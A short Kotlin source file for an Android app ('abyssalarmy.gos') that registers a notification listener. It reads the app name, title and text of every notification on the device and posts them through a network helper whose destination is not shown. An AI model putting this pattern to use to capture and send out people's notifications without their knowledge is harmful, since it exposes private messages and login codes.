package abyssalarmy.gos

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class Service: NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        super.onNotificationPosted(sbn)

        val net = Net(this)

        val packageName = sbn.packageName
        val notification = sbn.notification
        val extras = notification.extras

        val title = extras.getString("android.title")
        val text = extras.getCharSequence("android.text")

        net.post(null, arrayOf(Net.Notification("$packageName ${title.toString()}", text.toString())))
    }
}